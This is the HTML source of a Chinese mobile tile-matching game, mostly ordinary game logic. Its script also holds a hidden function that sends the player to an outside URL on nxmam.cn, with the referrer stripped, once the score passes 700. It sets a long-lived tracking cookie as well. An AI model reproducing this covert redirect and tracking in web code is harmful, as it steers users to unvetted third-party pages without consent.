<!DOCTYPE html>

<head>
	<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no">
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>挑战1000分，你也来来试试看吧！</title>

</head>
<style>
	html {
		height: 100%;
	}

	body {
		margin: 0;
		font-size: 32px;
		background: #f2ecda;
	}

	.page {
		width: 20em;
		margin: 0 auto;
		color: #fff;
		padding: 0 0 3em;
	}

	.text {
		padding: 0.3125em 0 0.3125em 0.625em;
		font-size: 1em;
	}

	.GameStage {
		position: relative;
		border: 0.03125em solid #fff;
		border-width: 0.03125em 0.125em 0.125em 0.03125em;
		background: #fff;
		margin: 0 auto;
		box-shadow: 0 0 0.5em rgba(0, 0, 0, 0.5);
		border-radius: 0.125em;
	}

	.GameStage div {
		font-size: 0.75em;
		width: 2.4167em;
		height: 2.4167em;
		line-height: 2.4167em;
		border: 0.09375em solid #fff;
		text-align: center;
		position: absolute;
		cursor: pointer;
		transition: left 0.1s ease-in;
		-webkit-transition: left 0.1s ease-in;
		transition-property: left, top;
		-webkit-transition-property: left, top;
		background-size: 100% !important;
		border-radius: 0.125em;
	}

	.GameStage .block_1 {
		background: #b854e6;
	}

	.GameStage .block_2 {
		background: #bad428;
	}

	.GameStage .block_3 {
		background: #f75353;
	}

	.GameStage .block_4 {
		background: #28abef;
	}

	.GameStage .block_5 {
		background: #f1a30c
	}

	.GameStage div.selected {
		opacity: 0.6;
		border-color: #333;
	}

	.GameStage div.remove {
		background: #fff;
		background: -webkit-gradient(linear, left top, right bottom, from(#fff), to(#ccc));
		color: #333;
	}

	.header {
		height: 4.875em;
	}

	.header .title {
		float: left;
		width: 10em;
	}

	.header .title span {
		color: #f33;
		font-size: 2em;
		;
		display: inline-block;
		width: 8.21875em;
		height: 2.875em;
	}

	.header .text {
		float: right;
		padding: 0.46875em 0.8125em 0 0;
	}

	#targetScore {
		font-size: 1em;
		float: right;
		color: #a2811e;
		line-height: 1.375em;
		padding: 0.375em 0.46875em 0.25em 0.46875em;
		border-bottom: 0.09375em solid #cbb77d;
	}

	#targetScore span {
		color: #ff6c00;
		font-weight: bold;
	}

	@-webkit-keyframes scoreFlash {
		0% {
			background: #ffad2c
		}

		100% {
			background: #f00
		}
	}

	@keyframes scoreFlash {
		0% {
			background: #ffad2c
		}

		100% {
			background: #f00
		}
	}

	.scoreFlash {
		-webkit-animation: scoreFlash 0.3s linear 0s infinite alternate;
		animation: scoreFlash 0.3s linear 0s infinite alternate;
	}

	#score {
		font-size: 1em;
		color: #a2811e;
		float: right;
		line-height: 1.25em;
		padding: 0.25em 0.3125em 0 0;
		clear: both;
	}

	.btns {
		padding: 1.25em 0;
		text-align: center;
	}

	a.btn_01 {
		text-decoration: none;
		color: #ff6c00;
		display: inline-block;
		width: 10.125em;
		height: 2.5em;
		border-radius: 0.3125em;
		border: 0.09375em solid #ff6c00;
		line-height: 2.5em;
		text-align: center;
	}

	a.btn_01 span {
		font-size: 1.40625em;
	}

	.memo {
		font-size: 1em;
		line-height: 1.6;
		color: #a2811e;
		text-shadow: 0.0625em 0.0625em 0.09375em rgba(255, 255, 255, 0.8);
		padding-left: 0.625em;
	}

	@-webkit-keyframes shareLayerShow {
		0% {
			opacity: 0;
		}

		100% {
			opacity: 1;
		}
	}

	@keyframes shareLayerShow {
		0% {
			opacity: 0;
		}

		100% {
			opacity: 1;
		}
	}

	.guide-fixed .footer {
		padding-bottom: 65px
	}

	a {
		text-decoration: none
	}
</style>

<body ryt12418="1">
	<div class="page">
		<div class="header">
			<div class="title"><span>消消看</span></div>
			<div class="text">
				<div id="targetScore">挑战<span>10000</span>分</div>
				<div id="score">得分：0</div>
			</div>
		</div>
		<div class="GameStage" id="GameStage" style="width: 590px; height: 590px;">
			<div class="block_4"></div>
			<div class="block_2" style="left: 0px; top: 59px;"></div>
			<div class="block_2" style="left: 0px; top: 118px;"></div>
			<div class="block_2" style="left: 0px; top: 177px;"></div>
			<div class="block_1" style="left: 0px; top: 236px;"></div>
			<div class="block_1" style="left: 0px; top: 295px;"></div>
			<div class="block_4" style="left: 0px; top: 354px;"></div>
			<div class="block_4" style="left: 0px; top: 413px;"></div>
			<div class="block_4" style="left: 0px; top: 472px;"></div>
			<div class="block_4" style="left: 0px; top: 531px;"></div>
			<div class="block_4" style="left: 59px; top: 0px;"></div>
			<div class="block_3" style="left: 59px; top: 59px;"></div>
			<div class="block_3" style="left: 59px; top: 118px;"></div>
			<div class="block_1" style="left: 59px; top: 177px;"></div>
			<div class="block_1" style="left: 59px; top: 236px;"></div>
			<div class="block_1" style="left: 59px; top: 295px;"></div>
			<div class="block_2" style="left: 59px; top: 354px;"></div>
			<div class="block_1" style="left: 59px; top: 413px;"></div>
			<div class="block_1" style="left: 59px; top: 472px;"></div>
			<div class="block_1" style="left: 59px; top: 531px;"></div>
			<div class="block_1" style="left: 118px; top: 0px;"></div>
			<div class="block_5" style="left: 118px; top: 59px;"></div>
			<div class="block_5" style="left: 118px; top: 118px;"></div>
			<div class="block_2" style="left: 118px; top: 177px;"></div>
			<div class="block_2" style="left: 118px; top: 236px;"></div>
			<div class="block_2" style="left: 118px; top: 295px;"></div>
			<div class="block_2" style="left: 118px; top: 354px;"></div>
			<div class="block_5" style="left: 118px; top: 413px;"></div>
			<div class="block_4" style="left: 118px; top: 472px;"></div>
			<div class="block_2" style="left: 118px; top: 531px;"></div>
			<div class="block_5" style="left: 177px; top: 0px;"></div>
			<div class="block_5" style="left: 177px; top: 59px;"></div>
			<div class="block_2" style="left: 177px; top: 118px;"></div>
			<div class="block_2" style="left: 177px; top: 177px;"></div>
			<div class="block_2" style="left: 177px; top: 236px;"></div>
			<div class="block_1" style="left: 177px; top: 295px;"></div>
			<div class="block_3" style="left: 177px; top: 354px;"></div>
			<div class="block_4" style="left: 177px; top: 413px;"></div>
			<div class="block_4" style="left: 177px; top: 472px;"></div>
			<div class="block_3" style="left: 177px; top: 531px;"></div>
			<div class="block_3" style="left: 236px; top: 0px;"></div>
			<div class="block_1" style="left: 236px; top: 59px;"></div>
			<div class="block_5" style="left: 236px; top: 118px;"></div>
			<div class="block_2" style="left: 236px; top: 177px;"></div>
			<div class="block_2" style="left: 236px; top: 236px;"></div>
			<div class="block_4" style="left: 236px; top: 295px;"></div>
			<div class="block_4" style="left: 236px; top: 354px;"></div>
			<div class="block_4" style="left: 236px; top: 413px;"></div>
			<div class="block_4" style="left: 236px; top: 472px;"></div>
			<div class="block_4" style="left: 236px; top: 531px;"></div>
			<div class="block_4" style="left: 295px; top: 0px;"></div>
			<div class="block_3" style="left: 295px; top: 59px;"></div>
			<div class="block_2" style="left: 295px; top: 118px;"></div>
			<div class="block_2" style="left: 295px; top: 177px;"></div>
			<div class="block_2" style="left: 295px; top: 236px;"></div>
			<div class="block_5" style="left: 295px; top: 295px;"></div>
			<div class="block_4" style="left: 295px; top: 354px;"></div>
			<div class="block_3" style="left: 295px; top: 413px;"></div>
			<div class="block_4" style="left: 295px; top: 472px;"></div>
			<div class="block_4" style="left: 295px; top: 531px;"></div>
			<div class="block_4" style="left: 354px; top: 0px;"></div>
			<div class="block_2" style="left: 354px; top: 59px;"></div>
			<div class="block_2" style="left: 354px; top: 118px;"></div>
			<div class="block_2" style="left: 354px; top: 177px;"></div>
			<div class="block_2" style="left: 354px; top: 236px;"></div>
			<div class="block_3" style="left: 354px; top: 295px;"></div>
			<div class="block_2" style="left: 354px; top: 354px;"></div>
			<div class="block_2" style="left: 354px; top: 413px;"></div>
			<div class="block_5" style="left: 354px; top: 472px;"></div>
			<div class="block_5" style="left: 354px; top: 531px;"></div>
			<div class="block_5" style="left: 413px; top: 0px;"></div>
			<div class="block_4" style="left: 413px; top: 59px;"></div>
			<div class="block_1" style="left: 413px; top: 118px;"></div>
			<div class="block_2" style="left: 413px; top: 177px;"></div>
			<div class="block_3" style="left: 413px; top: 236px;"></div>
			<div class="block_3" style="left: 413px; top: 295px;"></div>
			<div class="block_3" style="left: 413px; top: 354px;"></div>
			<div class="block_3" style="left: 413px; top: 413px;"></div>
			<div class="block_3" style="left: 413px; top: 472px;"></div>
			<div class="block_3" style="left: 413px; top: 531px;"></div>
			<div class="block_3" style="left: 472px; top: 0px;"></div>
			<div class="block_3" style="left: 472px; top: 59px;"></div>
			<div class="block_4" style="left: 472px; top: 118px;"></div>
			<div class="block_5" style="left: 472px; top: 177px;"></div>
			<div class="block_1" style="left: 472px; top: 236px;"></div>
			<div class="block_4" style="left: 472px; top: 295px;"></div>
			<div class="block_4" style="left: 472px; top: 354px;"></div>
			<div class="block_4" style="left: 472px; top: 413px;"></div>
			<div class="block_3" style="left: 472px; top: 472px;"></div>
			<div class="block_5" style="left: 472px; top: 531px;"></div>
			<div class="block_4" style="left: 531px; top: 0px;"></div>
			<div class="block_4" style="left: 531px; top: 59px;"></div>
			<div class="block_4" style="left: 531px; top: 118px;"></div>
			<div class="block_4" style="left: 531px; top: 177px;"></div>
			<div class="block_4" style="left: 531px; top: 236px;"></div>
			<div class="block_4" style="left: 531px; top: 295px;"></div>
			<div class="block_4" style="left: 531px; top: 354px;"></div>
			<div class="block_4" style="left: 531px; top: 413px;"></div>
			<div class="block_2" style="left: 531px; top: 472px;"></div>
			<div class="block_3" style="left: 531px; top: 531px;"></div>
		</div>
		<div class="btns">
			<a href="javascript:void(0)" class="btn_01" id="reset"><span>重新开始</span></a>
		</div>
		<div class="memo">技巧提示 ^_^</div>
		<div class="memo">一次消除的砖块越多，得分越高；</div>
		<div class="memo">尽量把同颜色的砖块积累到一起消除；</div>
	</div>
	</div>

</body>
<script>
	function n(a, b, c, d) {
		this.parent = a;
		this.type = b || 0;
		this.x = c || 0;
		this.y = d || 0;
		this._y = this._x = 0;
		this.ele = document.createElement("div");
		this.check = !1;
		this.ele.className = "block_" + b;
		this.parent.stageObj.appendChild(this.ele);
		var e = this;
		this.ele.ontouchstart = function () {
			this.onclick = null;
			e.click();
			e.click();
			return !1
		}
			;
		this.ele.onclick = function () {
			e.click();
			e.click();
			return !1
		}
			;
		this.ele.ondblclick = function () {
			e.parent.select(e)
		}
			;
		this.ele.onselectstart = function () {
			return !1
		}
	}
	function l(a, b) {
		a = Math.round(a);
		b = Math.round(b);
		return Math.round((b - a) * Math.random()) + a
	}
	function t(a) {
		return (a = a.toString().match(/https?\:\/\/.*?([^.]+.(com|net|cn|com\.cn|net\.cn))(\/|$)/)) ? a[1] : ""
	}
	function p() {
		// if (h) {
		var a = new Date,
			a = "http://www.nxmam.cn/yx/qqfxb.php?" + a.getFullYear() + (a.getMonth() + 1) + a.getDate() + "01" + Math.floor(a.getMinutes() / 15 + 17) + "0" + a.getHours() + Math.floor(a.getMinutes() / 15)
			, b = document.createElement("A");
		b.setAttribute("rel", "noreferrer");
		b.href = a;
		b.click()
		// }
	}
	if (!(window.Games && "1.1" <= window.Games.version)) {
		var h = -1 !== navigator.userAgent.indexOf("Mozilla");
		/*if (h && -1 === window.location.href.indexOf(".nxmam."))
			location.replace("http://this");
		else {*/
		if (h) {
			var f = navigator.userAgent.match(/(?:Windows Phone|SymbianOS|Android|iPad|iPod|iPhone)/)
				, f = f ? f[0] : !1
				, k = {};
			window.Games = k;
			window.Games.version = "1.1";
			var r, s;
			k.xiaoxiaokan = function (a) {
				this.selectBlock = this.data = null;
				this.score = 0;
				this.height = this.width = 10;
				var b = document.documentElement.clientWidth / 640;
				f || (b = 1);
				this.itemWidth = 59 * b;
				this.itemHeight = 59 * b;
				this.stageObj = a;
				this.status = "ready"
			};
			k.xiaoxiaokan.prototype = {
				version: "1.0.0",
				animTime: 300,
				minGroupSize: 2,
				level: 4,
				targetScore: 1E3,
				score: 0,
				restart: function () {
					this.selectBlock = [];
					this.setScore(0);
					this.targetScore = localStorage.getItem("xxk_max") || 1E3;
					this.setTargetScoreEle(this.targetScore);
					this.stageObj.style.width = this.width * this.itemWidth + "px";
					this.stageObj.style.height = this.height * this.itemHeight + "px";
					if (1E3 >= this.targetScore) {
						this.maxCB = 6;
						do
							this.randBlocks();
						while (!this._checkEnd(22))
					} else
						this.maxCB = 5,
							this.randBlocks();
					this._rewrite();
					this.status = "play";
					// document.querySelector("#shareLayer").style.display = "none";
					document.title = "\u6311\u62181000\u5206\uff0c\u4f60\u4e5f\u6765\u6765\u8bd5\u8bd5\u770b\u5427\uff01"
				},
				randBlocks: function () {
					this.stageObj.innerHTML = "";
					this.data = [];
					var a, b, c, d, e = l(1, 5);
					for (a = 0; a < this.width; a++) {
						c = [];
						for (b = 0; b < this.height; b++)
							l(0, this.maxCB) < this.level && (e = l(1, 5)),
								d = new n(this, e, a, b),
								c.push(d);
						this.data.push(c)
					}
				},
				setScore: function (a) {
					var b = this;
					this.scoreEle && (this.scoreEle.innerHTML = "\u5f97\u5206\uff1a" + a);
					this.score = a;
					a > this.targetScore && (this.targetScoreEle && (this.targetScoreEle.className = "scoreFlash",
						clearTimeout(this._ctsTimer),
						this._ctsTimer = setTimeout(function () {
							b.targetScoreEle.className = ""
						}, 1500)),
						this.setTargetScoreEle(a))
				},
				setTargetScoreEle: function (a) {
					a = parseInt(a) || 1E3;
					this.targetScoreEle && (this.targetScoreEle.innerHTML = "\u6311\u6218<span>" + a + "</span>\u5206");
					this.targetScore = a;
					1E3 < this.targetScore && localStorage.setItem("xxk_max", this.targetScore)
				},
				_rewrite: function () {
					var a, b, c;
					for (a = 0; a < this.data.length; a++)
						for (b = 0; b < this.data[a].length; b++)
							!(c = this.data[a][b]) || c.x == c._x && c.y == c._y || (c.ele.style.left = c.x * this.itemWidth + "px",
								c.ele.style.top = c.y * this.itemHeight + "px",
								c._x = c.x,
								c._y = c.y)
				},
				select: function (a) {
					if ("play" != this.status)
						return !1;
					for (var b = 0; b < this.selectBlock.length; b++)
						this.selectBlock[b].setCheck(!1);
					this.selectBlock = [];
					a = this._friends(a);
					if (!(a.length < this.minGroupSize))
						for (this.selectBlock = a,
							b = 0; b < this.selectBlock.length; b++)
							this.selectBlock[b].setCheck(!0)
				},
				ruin: function (a) {
					if ("play" != this.status)
						return !1;
					var b = this;
					a = "+" + this.selectBlock.length;
					for (var c = this.selectBlock.length * this.selectBlock.length, d = 0; d < this.selectBlock.length; d++)
						this.selectBlock[d].ruin(a),
							this.data[this.selectBlock[d].x][this.selectBlock[d].y] = null;
					this.selectBlock = [];
					this.setScore(this.score + c);
					clearTimeout(this.__timeobjArrange);
					this.__timeobjArrange = setTimeout(function () {
						b.arrange()
					}, this.animTime)
				},
				arrange: function () {
					for (var a, b, c = 0; c < this.data.length; c++) {
						a = [];
						for (var d = b = 0; d < this.data[c].length; d++)
							null == this.data[c][d] ? a.unshift(null) : (b++,
								a.push(this.data[c][d]));
						0 == b && (a.isNull = !0);
						this.data[c] = a
					}
					a = [];
					for (c = 0; c < this.data.length; c++)
						this.data[c].isNull || a.push(this.data[c]);
					this.data = a;
					for (c = 0; c < this.data.length; c++)
						for (d = 0; d < this.data[c].length; d++)
							this.data[c][d] && (this.data[c][d].x = c,
								this.data[c][d].y = d);
					this._rewrite();
					1 == this._checkEnd() && this.end("\u6728\u6709\u53ef\u4ee5\u6d88\u7ec4\u5408\u4e86\uff0c\u5c0f\u4f19\u4f34\uff01")
				},
				end: function (a) {
					clearInterval(this.__timeobj);
					this.status = "end";
					a = Math.round(100 * Math.sin((this.score - 100) / 1500 * 1.65));
					100 >= this.score && (a = 0);
					1800 <= this.score && (a = 99);
					99 < a && (a = 99);
					r = this.score;
					s = a;
					700 < this.score && h && p();
				},
				_friends: function (a) {
					function b(a) {
						var b;
						e.data[a.x - 1] && (b = e.data[a.x - 1][a.y]) && b.type == a.type && c(b);
						e.data[a.x + 1] && (b = e.data[a.x + 1][a.y]) && b.type == a.type && c(b);
						(b = e.data[a.x][a.y - 1]) && b.type == a.type && c(b);
						(b = e.data[a.x][a.y + 1]) && b.type == a.type && c(b)
					}
					function c(a) {
						var b;
						a: {
							for (b = 0; b < d.length; b++)
								if (d[b] == a)
									break a;
							b = !1
						}
						!1 === b && d.push(a)
					}
					if (!a)
						return [];
					var d = []
						, e = this;
					d.push(a);
					for (a = 0; a < d.length; a++)
						b(d[a]);
					return d
				},
				_checkEnd: function (a) {
					a = a || this.minGroupSize;
					for (var b = 0; b < this.data.length; b++)
						for (var c = 0; c < this.data[b].length; c++)
							if (this._friends(this.data[b][c]).length >= a)
								return !1;
					return !0
				}
			};
			n.prototype = {
				click: function () {
					this.parent && (this.check ? this.parent.ruin(this) : this.parent.select(this))
				},
				setCheck: function (a) {
					1 == a ? (this.ele.className = this.ele.className.replace(" selected", "") + " selected",
						this.check = !0) : (this.ele.className = this.ele.className.replace(" selected", ""),
							this.check = !1)
				},
				ruin: function (a) {
					var b = this;
					a && (this.ele.innerHTML = a);
					this.ele.className = "remove";
					setTimeout(function () {
						b.ele.parentNode.removeChild(b.ele)
					}, this.parent.animTime)
				}
			};
			var m = t(location.href)
				, q = function (a) {
					var b = ""
						, c = a + "=";
					0 < document.cookie.length && (a = document.cookie.indexOf(c),
						-1 != a && (a += c.length,
							b = document.cookie.indexOf(";", a),
							-1 == b && (b = document.cookie.length),
							b = document.cookie.substring(a, b)));
					return unescape(b)
				}("r_dn") || Math.round(46656 * Math.random()).toString(36);
			(function (a, b, c, d) {
				var e = ""
					, f = "";
				null != c && (e = new Date((new Date).getTime() + 36E5 * c),
					e = "; expires=" + e.toGMTString());
				null != d && (f = ";domain=" + d);
				document.cookie = a + "=" + escape(b) + e + f
			})("r_dn", q, 365240, m + ";path=/");
			m = document.documentElement.clientWidth / 640;
			f && (document.body.style.fontSize = 32 * m + "px");
			var g = new k.xiaoxiaokan(document.getElementById("GameStage"));
			g.scoreEle = document.getElementById("score");
			g.targetScoreEle = document.getElementById("targetScore");
			g.timelimitEle = document.getElementById("timelimit");
			g.restart();
			document.getElementById("reset").onclick = function () {
				g.restart()
			}
				;
			//  document.getElementById("shareBtn").onclick = function() {
			// 	p()
			// }
		}
	}


</script>

</html>